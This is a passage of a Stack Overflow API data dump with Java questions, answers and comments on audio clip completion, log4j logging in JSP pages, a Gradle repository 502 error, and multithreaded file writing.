Files.readAllBytes(path);\n</code></pre>\n<p>}</p>\n<p>when I trying to run my service it says out of heap memory error. Can you help me with this ?</p>\n"},{"tags":["java","audio","addeventlistener","detection","javasound"],"comments":[{"owner":{"account_id":1324952,"reputation":5977,"user_id":1270000,"accept_rate":100,"display_name":"sorifiend"},"score":0,"creation_date":1640260325,"post_id":70461618,"comment_id":124555089,"body_markdown":"Just a note: You know exactly when the sound starts playing because you trigger it within your code, and you can get the sound length before it starts playing, so you know exactly how long it should run for. So there should be no need for a listener? Use a timer to wait for the sound length, then trigger the next screen/game element to be displayed.","body":"Just a note: You know exactly when the sound starts playing because you trigger it within your code, and you can get the sound length before it starts playing, so you know exactly how long it should run for. So there should be no need for a listener? Use a timer to wait for the sound length, then trigger the next screen/game element to be displayed."},{"owner":{"account_id":424804,"reputation":7765,"user_id":805007,"accept_rate":83,"display_name":"Phil Freihofner"},"score":0,"creation_date":1640315008,"post_id":70461618,"comment_id":124568655,"body_markdown":"@sorifiend Your suggestion about calculating lengths is tempting but not generally used. The degree of precision is much higher and more reliable with a line listener. Also, the amount of work required if you decide to alter the length of the cue is also much greater.","body":"@sorifiend Your suggestion about calculating lengths is tempting but not generally used. The degree of precision is much higher and more reliable with a line listener. Also, the amount of work required if you decide to alter the length of the cue is also much greater."},{"owner":{"account_id":424804,"reputation":7765,"user_id":805007,"accept_rate":83,"display_name":"Phil Freihofner"},"score":1,"creation_date":1640315933,"post_id":70461618,"comment_id":124568771,"body_markdown":"To improve your chances of getting help, I recommend showing us your attempts to *listen* to the end of a single sound asset. As it stands, there&#39;s a lot of code pertaining to your project, but that distracts from the question at hand.","body":"To improve your chances of getting help, I recommend showing us your attempts to <i>listen</i> to the end of a single sound asset. As it stands, there&#39;s a lot of code pertaining to your project, but that distracts from the question at hand."},{"owner":{"account_id":183279,"reputation":168313,"user_id":418556,"accept_rate":98,"display_name":"Andrew Thompson"},"score":0,"creation_date":1640321831,"post_id":70461618,"comment_id":124569456,"body_markdown":"To further the suggestion of @PhilFreihofner, I recommend creating a [mre]. To go the extra length, generate a tone in the source code. A tip on doing that MRE: It only needs one `Clip`. If the code can do the appropriate thing with one clip, it should work for 5 (or 100),","body":"To further the suggestion of @PhilFreihofner, I recommend creating a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. To go the extra length, generate a tone in the source code. A tip on doing that MRE: It only needs one <code>Clip</code>. If the code can do the appropriate thing with one clip, it should work for 5 (or 100),"}],"owner":{"account_id":14085595,"reputation":121,"user_id":10175441,"display_name":"Unearthly"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":203,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640259388,"creation_date":1640259388,"question_id":70461618,"body_markdown":"i&#39;m trying to build my first game in Java: Pacman.\r\nI&#39;m facing the following problem: I&#39;d like the game to freeze while the intro music is playing, so I need to know how to detect it. I was told to use the `LineListener`, I really tried but I couldn&#39;t figure out how it works from the Oracle docs...\r\n\r\nHere&#39;s my GameSounds class:\r\n\r\n    package it.pacman.audio;\r\n    \r\n    import javax.sound.sampled.AudioInputStream;\r\n    import javax.sound.sampled.AudioSystem;\r\n    import javax.sound.sampled.Clip;\r\n    import java.net.URL;\r\n    \r\n    \r\n    /* This class controls all sound effects*/\r\n    public class GameSounds{\r\n        \r\n        Clip nomNom;\r\n        Clip newGame;\r\n        Clip death;\r\n        Clip eatGhost;\r\n        Clip powerPellet;\r\n        /* Keeps track of whether or not the eating sound is playing*/\r\n        boolean stopped, power_pellet;\r\n           \r\n    \r\n    /* Initialize audio files */ \r\n        public GameSounds(){\r\n            stopped=true; \r\n            power_pellet=true; \r\n            URL url;\r\n            AudioInputStream audioIn;\r\n            \r\n            try{\r\n                // Pacman eating sound\r\n                url = this.getClass().getClassLoader().getResource(&quot;sounds/nomnom.wav&quot;);\r\n                audioIn = AudioSystem.getAudioInputStream(url);\r\n                nomNom = AudioSystem.getClip();\r\n                nomNom.open(audioIn);\r\n                \r\n                // newGame        \r\n                url = this.getClass().getClassLoader().getResource(&quot;sounds/newGame.wav&quot;);\r\n                audioIn = AudioSystem.getAudioInputStream(url);\r\n                newGame = AudioSystem.getClip();\r\n                newGame.open(audioIn);\r\n                \r\n                // death        \r\n                url = this.getClass().getClassLoader().getResource(&quot;sounds/death.wav&quot;);\r\n                audioIn = AudioSystem.getAudioInputStream(url);\r\n                death = AudioSystem.getClip();\r\n                death.open(audioIn);\r\n    \r\n                // eatGhost       \r\n                url = this.getClass().getClassLoader().getResource(&quot;sounds/eatGhost.wav&quot;);\r\n                audioIn = AudioSystem.getAudioInputStream(url);\r\n                eatGhost = AudioSystem.getClip();\r\n                eatGhost.open(audioIn);\r\n                \r\n                // powerPellet        \r\n                url = this.getClass().getClassLoader().getResource(&quot;sounds/powerPellet.wav&quot;);\r\n                audioIn = AudioSystem.getAudioInputStream(url);\r\n                powerPellet = AudioSystem.getClip();\r\n                powerPellet.open(audioIn);\r\n    \r\n            }catch(Exception e){\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n        \r\n        /* Play pacman eating sound */\r\n        public void nomNom(){\r\n            /* If it&#39;s already playing, don&#39;t start it playing again!*/\r\n            if (!stopped)\r\n              return;\r\n    \r\n            stopped=false;\r\n            nomNom.stop();\r\n            nomNom.setFramePosition(0);\r\n            nomNom.loop(Clip.LOOP_CONTINUOUSLY);\r\n        }\r\n    \r\n        /* Stop pacman eating sound */\r\n        public void nomNomStop(){\r\n            stopped=true;\r\n            nomNom.stop();\r\n            nomNom.setFramePosition(0);\r\n        }\r\n        \r\n        /* Play new game sound */\r\n        public void newGame(){\r\n            newGame.stop();\r\n            newGame.setFramePosition(0);\r\n            newGame.start();\r\n        }\r\n        \r\n        /* Play pacman death sound */\r\n        public void death(){\r\n            death.stop();\r\n            death.setFramePosition(0);\r\n            death.start();\r\n        }\r\n    \r\n        /* Play eat ghost sound */\r\n        public void eatGhost(){\r\n            eatGhost.stop();\r\n            eatGhost.setFramePosition(0);\r\n            eatGhost.start();\r\n        }\r\n    \r\n        /* Play power pellet sound */\r\n        public void powerPellet(){\r\n            /* If it&#39;s already going, don&#39;t start it again!*/\r\n            if (!power_pellet)\r\n              return;\r\n    \r\n            power_pellet=false;\r\n            powerPellet.stop();\r\n            powerPellet.setFramePosition(0);\r\n            powerPellet.loop(Clip.LOOP_CONTINUOUSLY);\r\n        }\r\n    \r\n        /* Stop power pellet sound */\r\n        public void powerPelletStop(){\r\n            power_pellet=true;\r\n            powerPellet.stop();\r\n            powerPellet.setFramePosition(0);\r\n        }\r\n    \r\n    }\r\n\r\n\r\nAnd here&#39;s a chunk of code where I make the game start a new level:\r\n\r\n       private void initLevel2() {\r\n            sounds.newGame();\r\n    \r\n            lives = 3;\r\n            level = 2;\r\n            for (int i = 0; i &lt; N_BLOCKS * N_BLOCKS; i++) {\r\n                FIRSTMAP[i] = LevelModel.SECONDMAP.getMap()[i];\r\n                screenData[i] = LevelModel.SECONDMAP.getMap()[i];\r\n            }\r\n    \r\n            continueLevel();\r\n        }\r\n\r\nCan you please provide a simple example so that I could understand it and implement it? (Even not related to my code) Any help would be appreciated...\r\n\r\nThanks a lot.","title":"Check when a sound finishes playing in Java","body":"<p>i'm trying to build my first game in Java: Pacman.\nI'm facing the following problem: I'd like the game to freeze while the intro music is playing, so I need to know how to detect it. I was told to use the <code>LineListener</code>, I really tried but I couldn't figure out how it works from the Oracle docs...</p>\n<p>Here's my GameSounds class:</p>\n<pre><code>package it.pacman.audio;\n\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.Clip;\nimport java.net.URL;\n\n\n/* This class controls all sound effects*/\npublic class GameSounds{\n    \n    Clip nomNom;\n    Clip newGame;\n    Clip death;\n    Clip eatGhost;\n    Clip powerPellet;\n    /* Keeps track of whether or not the eating sound is playing*/\n    boolean stopped, power_pellet;\n       \n\n/* Initialize audio files */ \n    public GameSounds(){\n        stopped=true; \n        power_pellet=true; \n        URL url;\n        AudioInputStream audioIn;\n        \n        try{\n            // Pacman eating sound\n            url = this.getClass().getClassLoader().getResource(&quot;sounds/nomnom.wav&quot;);\n            audioIn = AudioSystem.getAudioInputStream(url);\n            nomNom = AudioSystem.getClip();\n            nomNom.open(audioIn);\n            \n            // newGame        \n            url = this.getClass().getClassLoader().getResource(&quot;sounds/newGame.wav&quot;);\n            audioIn = AudioSystem.getAudioInputStream(url);\n            newGame = AudioSystem.getClip();\n            newGame.open(audioIn);\n            \n            // death        \n            url = this.getClass().getClassLoader().getResource(&quot;sounds/death.wav&quot;);\n            audioIn = AudioSystem.getAudioInputStream(url);\n            death = AudioSystem.getClip();\n            death.open(audioIn);\n\n            // eatGhost       \n            url = this.getClass().getClassLoader().getResource(&quot;sounds/eatGhost.wav&quot;);\n            audioIn = AudioSystem.getAudioInputStream(url);\n            eatGhost = AudioSystem.getClip();\n            eatGhost.open(audioIn);\n            \n            // powerPellet        \n            url = this.getClass().getClassLoader().getResource(&quot;sounds/powerPellet.wav&quot;);\n            audioIn = AudioSystem.getAudioInputStream(url);\n            powerPellet = AudioSystem.getClip();\n            powerPellet.open(audioIn);\n\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    \n    /* Play pacman eating sound */\n    public void nomNom(){\n        /* If it's already playing, don't start it playing again!*/\n        if (!stopped)\n          return;\n\n        stopped=false;\n        nomNom.stop();\n        nomNom.setFramePosition(0);\n        nomNom.loop(Clip.LOOP_CONTINUOUSLY);\n    }\n\n    /* Stop pacman eating sound */\n    public void nomNomStop(){\n        stopped=true;\n        nomNom.stop();\n        nomNom.setFramePosition(0);\n    }\n    \n    /* Play new game sound */\n    public void newGame(){\n        newGame.stop();\n        newGame.setFramePosition(0);\n        newGame.start();\n    }\n    \n    /* Play pacman death sound */\n    public void death(){\n        death.stop();\n        death.setFramePosition(0);\n        death.start();\n    }\n\n    /* Play eat ghost sound */\n    public void eatGhost(){\n        eatGhost.stop();\n        eatGhost.setFramePosition(0);\n        eatGhost.start();\n    }\n\n    /* Play power pellet sound */\n    public void powerPellet(){\n        /* If it's already going, don't start it again!*/\n        if (!power_pellet)\n          return;\n\n        power_pellet=false;\n        powerPellet.stop();\n        powerPellet.setFramePosition(0);\n        powerPellet.loop(Clip.LOOP_CONTINUOUSLY);\n    }\n\n    /* Stop power pellet sound */\n    public void powerPelletStop(){\n        power_pellet=true;\n        powerPellet.stop();\n        powerPellet.setFramePosition(0);\n    }\n\n}\n</code></pre>\n<p>And here's a chunk of code where I make the game start a new level:</p>\n<pre><code>   private void initLevel2() {\n        sounds.newGame();\n\n        lives = 3;\n        level = 2;\n        for (int i = 0; i &lt; N_BLOCKS * N_BLOCKS; i++) {\n            FIRSTMAP[i] = LevelModel.SECONDMAP.getMap()[i];\n            screenData[i] = LevelModel.SECONDMAP.getMap()[i];\n        }\n\n        continueLevel();\n    }\n</code></pre>\n<p>Can you please provide a simple example so that I could understand it and implement it? (Even not related to my code) Any help would be appreciated...</p>\n<p>Thanks a lot.</p>\n"},{"tags":["java","jsp","log4j"],"answers":[{"tags":[],"owner":{"account_id":43701,"reputation":2835,"user_id":127859,"accept_rate":80,"display_name":"Ryan"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1390816465,"creation_date":1256048621,"answer_id":1594972,"question_id":1594931,"body_markdown":"The following is the code. All the configuration file placement and configuration are the same as how it is use in Servlet or other class.\r\n\r\n    &lt;%@ page import=&quot;org.apache.log4j.Logger&quot; %&gt;\r\n    &lt;html&gt;\r\n        &lt;head&gt;\r\n            &lt;title&gt;Demonstration log4j usage in jsp&lt;/title&gt;\r\n        &lt;/head&gt;\r\n        &lt;body&gt;\r\n            &lt;% Logger log = Logger.getLogger(&quot;com.mobilefish.demo.test&quot;);\r\n               log.debug(&quot;Show DEBUG message&quot;);\r\n               log.info(&quot;Show INFO message&quot;);\r\n               log.warn(&quot;Show WARN message&quot;);\r\n               log.error(&quot;Show ERROR message&quot;);\r\n               log.fatal(&quot;Show FATAL message&quot;); %&gt;\r\n            &lt;b&gt;The log messages are shown in the Tomcat console and in the ${catalina.home}/logs/demo.log file.&lt;/b&gt;\r\n        &lt;/body&gt;\r\n    &lt;/html&gt;","title":"what is the right way to use log4j within jsp pages","body":"<p>The following is the code. All the configuration file placement and configuration are the same as how it is use in Servlet or other class.</p>\n\n<pre><code>&lt;%@ page import=\"org.apache.log4j.Logger\" %&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;Demonstration log4j usage in jsp&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;% Logger log = Logger.getLogger(\"com.mobilefish.demo.test\");\n           log.debug(\"Show DEBUG message\");\n           log.info(\"Show INFO message\");\n           log.warn(\"Show WARN message\");\n           log.error(\"Show ERROR message\");\n           log.fatal(\"Show FATAL message\"); %&gt;\n        &lt;b&gt;The log messages are shown in the Tomcat console and in the ${catalina.home}/logs/demo.log file.&lt;/b&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":11089,"reputation":400030,"user_id":21234,"accept_rate":91,"display_name":"skaffman"},"down_vote_count":1,"up_vote_count":6,"is_accepted":false,"score":5,"last_activity_date":1256048646,"creation_date":1256048646,"answer_id":1594975,"question_id":1594931,"body_markdown":"You could write a factory method which takes the current request as a parameter, and which obtains a Logger based on the JSP name, something like this:\r\n\r\n\tpublic static Logger getLogger(HttpServletRequest request) {\r\n\t\tString requestUri = request.getRequestURI();\r\n\t\tString jspName = requestUri.substring(requestUri.lastIndexOf(&#39;/&#39;));\r\n\t\treturn Logger.getLogger(jspName);\r\n\t}\r\n\r\nYou might have to play with it a bit to make it work (I haven&#39;t tested the above code), but that&#39;s the gist of it.\r\n\r\nThis could be used directly from the JSP, or from a bean or tag class which is used by the JSP, as long as it has access to the request object.","title":"what is the right way to use log4j within jsp pages","body":"<p>You could write a factory method which takes the current request as a parameter, and which obtains a Logger based on the JSP name, something like this:</p>\n\n<pre><code>public static Logger getLogger(HttpServletRequest request) {\n    String requestUri = request.getRequestURI();\n    String jspName = requestUri.substring(requestUri.lastIndexOf('/'));\n    return Logger.getLogger(jspName);\n}\n</code></pre>\n\n<p>You might have to play with it a bit to make it work (I haven't tested the above code), but that's the gist of it.</p>\n\n<p>This could be used directly from the JSP, or from a bean or tag class which is used by the JSP, as long as it has access to the request object.</p>\n"},{"tags":[],"owner":{"account_id":61045,"reputation":2660,"user_id":182094,"accept_rate":78,"display_name":"NT_"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1256287615,"creation_date":1256048729,"answer_id":1594989,"question_id":1594931,"body_markdown":"Use the appropriate [ConversionPattern][1] when configuring log4j, e.g:\r\n\r\n    %d [%C] %-5p %c - %m%n\r\n\r\nHere, the %C outputs the fully qualified class name when you call any of the Logger class methods.\r\n\r\n\r\n  [1]: http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/PatternLayout.html","title":"what is the right way to use log4j within jsp pages","body":"<p>Use the appropriate <a href=\"http://logging.apache.org/log4j/1.2/apidocs/org/apache/log4j/PatternLayout.html\" rel=\"nofollow noreferrer\">ConversionPattern</a> when configuring log4j, e.g:</p>\n\n<pre><code>%d [%C] %-5p %c - %m%n\n</code></pre>\n\n<p>Here, the %C outputs the fully qualified class name when you call any of the Logger class methods.</p>\n"},{"tags":[],"owner":{"account_id":62515,"reputation":45036,"user_id":185722,"accept_rate":100,"display_name":"Alexander Pogrebnyak"},"down_vote_count":1,"up_vote_count":10,"is_accepted":true,"score":9,"last_activity_date":1256175460,"creation_date":1256175460,"answer_id":1604590,"question_id":1594931,"body_markdown":"What&#39;s wrong with:\r\n\r\n    Logger logger = Logger.getLogger( &quot;source.jsp&quot; );\r\n\r\nYou can prepend it with a better non-ambiguous prefix, of course.  Actually, something along the lines `JSPS.source.jsp` is better, as you can set up logging rules for `JSPS` logger, that would later be applied to all sub-loggers.\r\n\r\nHaving said this, why do you need to log from JSP directly?","title":"what is the right way to use log4j within jsp pages","body":"<p>What's wrong with:</p>\n\n<pre><code>Logger logger = Logger.getLogger( \"source.jsp\" );\n</code></pre>\n\n<p>You can prepend it with a better non-ambiguous prefix, of course.  Actually, something along the lines <code>JSPS.source.jsp</code> is better, as you can set up logging rules for <code>JSPS</code> logger, that would later be applied to all sub-loggers.</p>\n\n<p>Having said this, why do you need to log from JSP directly?</p>\n"},{"tags":[],"owner":{"account_id":1059980,"reputation":241,"user_id":1061816,"display_name":"Pavan Dave"},"down_vote_count":0,"up_vote_count":24,"is_accepted":false,"score":24,"last_activity_date":1491557149,"creation_date":1322048615,"answer_id":8241610,"question_id":1594931,"body_markdown":"Firstly, import the required package i.e.\r\n\r\n    &lt;%@page import=&quot;org.apache.log4j.Logger&quot;%&gt;\r\nthen,\r\n\r\n     &lt;%! static Logger logger = Logger.getLogger(jsppagename_jsp.class); %&gt;\r\n\r\nthe `jsppagename_jsp` may change, according to the server which you are using. And then, use anywhere inside jsp like:\r\n\r\n    &lt;% logger.info(&quot;This is test.&quot;); %&gt;\r\n\r\nThe IDE may show an error message at the declaration of logger object. But, don&#39;t worry, the server like tomcat will automatically create the corresponding servlet class of each jsp page inside tomcat directly itself.","title":"what is the right way to use log4j within jsp pages","body":"<p>Firstly, import the required package i.e.</p>\n\n<pre><code>&lt;%@page import=\"org.apache.log4j.Logger\"%&gt;\n</code></pre>\n\n<p>then,</p>\n\n<pre><code> &lt;%! static Logger logger = Logger.getLogger(jsppagename_jsp.class); %&gt;\n</code></pre>\n\n<p>the <code>jsppagename_jsp</code> may change, according to the server which you are using. And then, use anywhere inside jsp like:</p>\n\n<pre><code>&lt;% logger.info(\"This is test.\"); %&gt;\n</code></pre>\n\n<p>The IDE may show an error message at the declaration of logger object. But, don't worry, the server like tomcat will automatically create the corresponding servlet class of each jsp page inside tomcat directly itself.</p>\n"},{"tags":[],"owner":{"account_id":245690,"reputation":14585,"user_id":519334,"accept_rate":86,"display_name":"k3b"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1426695014,"creation_date":1426695014,"answer_id":29127070,"question_id":1594931,"body_markdown":"Since it is likely that you want to output the content of jsp-el-variables in log4net you can use this code\r\n\r\n\t&lt;%@page import=&quot;org.apache.log4j.Logger&quot;%&gt;\r\n\t\r\n\t&lt;%-- output of the jsp-el variables &quot;orderID&quot; and &quot;orderDate&quot; in log4j --%&gt;\r\n\t&lt;c:set var=&quot;Parameter4Log4J&quot; value=&quot;orderID=${orderID} orderDate=${orderDate}&quot; /&gt;\r\n\t&lt;% Logger.getLogger(&quot;jsp.order.orderconfirmation&quot;).info(\r\n                   pageContext.getAttribute(&quot;Parameter4Log4J&quot;)); %&gt;\t\r\n","title":"what is the right way to use log4j within jsp pages","body":"<p>Since it is likely that you want to output the content of jsp-el-variables in log4net you can use this code</p>\n\n<pre><code>&lt;%@page import=\"org.apache.log4j.Logger\"%&gt;\n\n&lt;%-- output of the jsp-el variables \"orderID\" and \"orderDate\" in log4j --%&gt;\n&lt;c:set var=\"Parameter4Log4J\" value=\"orderID=${orderID} orderDate=${orderDate}\" /&gt;\n&lt;% Logger.getLogger(\"jsp.order.orderconfirmation\").info(\n               pageContext.getAttribute(\"Parameter4Log4J\")); %&gt; \n</code></pre>\n"},{"tags":[],"owner":{"account_id":177019,"reputation":972,"user_id":408098,"accept_rate":92,"display_name":"Scott Chu"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1509003087,"creation_date":1509001744,"answer_id":46947863,"question_id":1594931,"body_markdown":"Though an old question, I&#39;d like to provide some options. Say jsp filename = for_example.jsp:\r\n\r\n**1. Use file name directly but replace dot with underscore**\r\n\r\n    Logger log = Logger.getLogger(&quot;for_example_jsp&quot;);\r\n\r\n(note: constantly mistake is to use &#39;for_example.jsp&#39; directly, it will be treated as class name and then when AP server, say Tomcat, finds no such class path, it will output log message in catalina.out as &quot;...(jsp) ....&quot;.\r\n\r\n**2. Use request URI**\r\n\r\n    Logger log = Logger.getLogger(request.getRequestURI());\r\n\r\nSomebody likes this. I don&#39;t know why but I&#39;ve seen this before in somebody&#39;s codes. \r\n\r\n**3. Use Class name**\r\n\r\n    Logger log = Logger.getLogger(this.getClass());\r\n\r\nthis will usually get &#39;for_example_jsp&quot; except when for_example.jsp is included in some other servlet, say &#39;test_servlet&#39;, it will be &#39;including file&#39;s log name&#39; + &#39;an ordered number&#39;, e.g. test_servlet_include_005.\r\n\r\n**4. Programatically get jsp file name**\r\n\r\n    String __jspName = this.getClass().getSimpleName(); // Get jsp program name\r\n    Logger log = Logger.getLogger(__jspName);\r\n    __jspName = __jspName.replaceAll(&quot;_&quot;,&quot;.&quot;); // get back true jsp file name\r\n\r\nHowever, this is not necessarily right with respect to what AP server and version you are using.\r\n\r\nI personally use method 1 as I think it&#39;s most reliable.\r\n","title":"what is the right way to use log4j within jsp pages","body":"<p>Though an old question, I'd like to provide some options. Say jsp filename = for_example.jsp:</p>\n\n<p><strong>1. Use file name directly but replace dot with underscore</strong></p>\n\n<pre><code>Logger log = Logger.getLogger(\"for_example_jsp\");\n</code></pre>\n\n<p>(note: constantly mistake is to use 'for_example.jsp' directly, it will be treated as class name and then when AP server, say Tomcat, finds no such class path, it will output log message in catalina.out as \"...(jsp) ....\".</p>\n\n<p><strong>2. Use request URI</strong></p>\n\n<pre><code>Logger log = Logger.getLogger(request.getRequestURI());\n</code></pre>\n\n<p>Somebody likes this. I don't know why but I've seen this before in somebody's codes. </p>\n\n<p><strong>3. Use Class name</strong></p>\n\n<pre><code>Logger log = Logger.getLogger(this.getClass());\n</code></pre>\n\n<p>this will usually get 'for_example_jsp\" except when for_example.jsp is included in some other servlet, say 'test_servlet', it will be 'including file's log name' + 'an ordered number', e.g. test_servlet_include_005.</p>\n\n<p><strong>4. Programatically get jsp file name</strong></p>\n\n<pre><code>String __jspName = this.getClass().getSimpleName(); // Get jsp program name\nLogger log = Logger.getLogger(__jspName);\n__jspName = __jspName.replaceAll(\"_\",\".\"); // get back true jsp file name\n</code></pre>\n\n<p>However, this is not necessarily right with respect to what AP server and version you are using.</p>\n\n<p>I personally use method 1 as I think it's most reliable.</p>\n"}],"owner":{"account_id":24717,"reputation":264452,"user_id":63051,"accept_rate":95,"display_name":"flybywire"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":52178,"favorite_count":0,"down_vote_count":0,"up_vote_count":15,"accepted_answer_id":1604590,"answer_count":7,"score":15,"last_activity_date":1640259376,"creation_date":1256048279,"question_id":1594931,"body_markdown":"I mean, I want the logger name to reflect the source.jsp file, no matter if it is included in another file or compiled to a class or whatever.","title":"what is the right way to use log4j within jsp pages","body":"<p>I mean, I want the logger name to reflect the source.jsp file, no matter if it is included in another file or compiled to a class or whatever.</p>\n"},{"tags":["java","android"],"comments":[{"owner":{"account_id":11079440,"reputation":360,"user_id":8135043,"display_name":"Shahnawaz Ansari"},"score":0,"creation_date":1640347033,"post_id":70461541,"comment_id":124574347,"body_markdown":"Please also post your app level and project level gradle.","body":"Please also post your app level and project level gradle."},{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1641066483,"post_id":70461541,"comment_id":124715350,"body_markdown":"Please provide enough code so others can better understand or reproduce the problem.","body":"Please provide enough code so others can better understand or reproduce the problem."}],"owner":{"account_id":23728299,"reputation":1,"user_id":17747916,"display_name":"Mangai Venkat"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":45,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640258961,"creation_date":1640258961,"question_id":70461541,"body_markdown":"When I try to build my project gradle build is failed and show disable offline mode error message. Then disable offline toggle and run it shows 3rd party api 502 Gateway error.\r\n\r\n502 GATEWAY ERROR MESSAGE - Could not HEAD &#39;https://tokbox.bintray.com/maven/com/github/EhsanMashhadi/CountryPicker/0.4.0/CountryPicker-0.4.0.pom&#39;. Received status code 502 from server: Bad Gateway\r\n\r\n[enter image description here][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/wWYHB.png","title":"Gradle build failure With Disable Offline mode error message","body":"<p>When I try to build my project gradle build is failed and show disable offline mode error message. Then disable offline toggle and run it shows 3rd party api 502 Gateway error.</p>\n<p>502 GATEWAY ERROR MESSAGE - Could not HEAD 'https://tokbox.bintray.com/maven/com/github/EhsanMashhadi/CountryPicker/0.4.0/CountryPicker-0.4.0.pom'. Received status code 502 from server: Bad Gateway</p>\n<p><a href=\"https://i.stack.imgur.com/wWYHB.png\" rel=\"nofollow noreferrer\">enter image description here</a></p>\n"},{"tags":["java","multithreading"],"comments":[{"owner":{"account_id":1281287,"reputation":4633,"user_id":1235336,"accept_rate":100,"display_name":"Alex Stybaev"},"score":15,"creation_date":1333624203,"post_id":10027020,"comment_id":12824189,"body_markdown":"just wondering, you got the same homework?\nhttp://stackoverflow.com/questions/9972549/threads-and-file-writing","body":"just wondering, you got the same homework? <a href=\"http://stackoverflow.com/questions/9972549/threads-and-file-writing\" title=\"threads and file writing\">stackoverflow.com/questions/9972549/threads-and-file-writing</a>"},{"owner":{"account_id":395272,"reputation":24521,"user_id":758133,"accept_rate":100,"display_name":"Martin James"},"score":2,"creation_date":1333627313,"post_id":10027020,"comment_id":12825299,"body_markdown":"20 threads.. 20 threads.. what are the chances?","body":"20 threads.. 20 threads.. what are the chances?"},{"owner":{"account_id":395272,"reputation":24521,"user_id":758133,"accept_rate":100,"display_name":"Martin James"},"score":1,"creation_date":1333627411,"post_id":10027020,"comment_id":12825333,"body_markdown":"different number of lines.. different number of lines..","body":"different number of lines.. different number of lines.."},{"owner":{"account_id":41796,"reputation":5244,"user_id":121540,"accept_rate":69,"display_name":"johnnycrash"},"score":1,"creation_date":1333667169,"post_id":10027020,"comment_id":12839730,"body_markdown":"Homework homework....give me a break!","body":"Homework homework....give me a break!"},{"owner":{"account_id":194169,"reputation":49718,"user_id":436341,"accept_rate":67,"display_name":"live-love"},"score":0,"creation_date":1530321973,"post_id":10027020,"comment_id":89209030,"body_markdown":"maybe same person...","body":"maybe same person..."}],"answers":[{"tags":[],"owner":{"account_id":1309492,"reputation":484,"user_id":1257803,"display_name":"BWitched"},"down_vote_count":1,"up_vote_count":31,"is_accepted":true,"score":30,"last_activity_date":1640258699,"creation_date":1333622524,"answer_id":10027087,"question_id":10027020,"body_markdown":"Access the file through a class that contains a [synchronized method](http://docs.oracle.com/javase/tutorial/essential/concurrency/syncmeth.html) to write to the file. Only one thread at a time will be able to execute the method.\r\n\r\nI think that Singleton pattern would fit for your problem:\r\n\r\n    package com.test.singleton;\r\n    \r\n    public class Singleton {\r\n        private static final Singleton inst= new Singleton();\r\n        \r\n        private Singleton() {\r\n            super();\r\n        }\r\n        \r\n        public synchronized void writeToFile(String str) {\r\n            // Do whatever\r\n        }\r\n        \r\n        public static Singleton getInstance() {\r\n            return inst;\r\n        }\r\n        \r\n    }\r\n\r\nEvery time you need to write to your file, you only would have to call:\r\n\r\n    Singleton.getInstance().writeToFile(&quot;Hello!!&quot;);\r\n\r\n","title":"Write to text file from multiple threads?","body":"<p>Access the file through a class that contains a <a href=\"http://docs.oracle.com/javase/tutorial/essential/concurrency/syncmeth.html\" rel=\"nofollow noreferrer\">synchronized method</a> to write to the file. Only one thread at a time will be able to execute the method.</p>\n<p>I think that Singleton pattern would fit for your problem:</p>\n<pre><code>package com.test.singleton;\n\npublic class Singleton {\n    private static final Singleton inst= new Singleton();\n    \n    private Singleton() {\n        super();\n    }\n    \n    public synchronized void writeToFile(String str) {\n        // Do whatever\n    }\n    \n    public static Singleton getInstance() {\n        return inst;\n    }\n    \n}\n</code></pre>\n<p>Every time you need to write to your file, you only would have to call:</p>\n<pre><code>Singleton.getInstance().writeToFile(&quot;Hello!!&quot;);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":247338,"reputation":4069,"user_id":521996,"accept_rate":75,"display_name":"George"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1333624805,"creation_date":1333624805,"answer_id":10027587,"question_id":10027020,"body_markdown":"You are intend to write data into one file. So if you try to lock the whole file, it&#39;d better to use a single thread to do this job. Although you spawn 20 threads, but there is only one of them is running every time you call the method, the others are just waiting for the lock.\r\n\r\nI recommend you use `RandomAccessFile` to write data to your file. Then each thread can write some unique data into to the file without locking the whole file.\r\n\r\nSome demo code as following\r\n\r\n    try {\r\n    \tfinal RandomAccessFile file = new RandomAccessFile(&quot;/path/to/your/result.txt&quot;, &quot;rw&quot;);\r\n    \tfinal int numberOfThread = 20;\r\n    \tfinal int bufferSize = 512;\r\n    \tExecutorService pool = Executors.newFixedThreadPool(numberOfThread);\r\n    \tfinal AtomicInteger byteCounter = new AtomicInteger(0);\r\n    \tfinal byte[] yourText = &quot;Your data&quot;.getBytes();\r\n    \tfor (int i = 0; i &lt; yourText.length; i++) {\r\n    \t\tpool.submit(new Runnable() {\r\n    \t\t\t@Override\r\n    \t\t\tpublic void run() {\r\n    \t\t\t\tint start = byteCounter.getAndAdd(bufferSize);\r\n    \t\t\t\tint chunkSize = bufferSize;\r\n    \t\t\t\tif (start + bufferSize &gt; yourText.length) {\r\n    \t\t\t\t\tchunkSize = yourText.length - start;\r\n    \t\t\t\t}\r\n    \t\t\t\tbyte[] chunkData = new byte[chunkSize];\r\n    \t\t\t\tSystem.arraycopy(yourText, start, chunkData, 